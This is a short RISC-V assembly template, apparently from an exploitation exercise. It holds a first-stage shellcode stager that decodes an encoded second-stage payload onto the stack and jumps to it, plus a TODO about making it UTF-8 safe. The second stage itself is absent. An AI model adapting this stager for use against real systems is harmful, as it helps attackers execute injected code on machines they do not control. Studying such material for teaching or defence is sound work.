#
# TODO: Change this first stage to be UTF-8 safe.  You will probably
# also need to change the payload encoding format.
#
	.globl	_start
	
	.text
_start:
# get payload address into s0
        auipc   s0, 0xfffff
        addi    s0, s0, 0x7ff
        addi    s0, s0, 0x7ff
        addi    s0, s0, 44
# get count into s1
	c.ld	s1, 0(s0)
	c.ld	a5, 8(s0)
	c.addi	s0, 16
	c.xor   s1, a5
0:

#Our work is here; A in a0, B in a1
	c.ld	a0, 0(s0)
	c.ld	a1, 8(s0)
	c.addi	s0, 16
	ori	a0, a0, 0xf
	c.slli	a1, 4
	ori	a1, a1, 0xf0
	c.or	a0, a1


# get word to write into a0
#	c.ld	a0, 0(s0)
#	c.ld	a1, 8(s0)
#	c.addi	s0, 16
#	c.xor   a0, a1
# store a0 on the stack
	c.addi	sp, -8
	c.sdsp	a0, 0(sp)
# loop
	c.addi	s1, -1
	c.bnez	s1, 0b
## jump to stage 2
	c.jr	sp
	.data
payload:
# SECOND STAGE SUBSTITUTED HERE
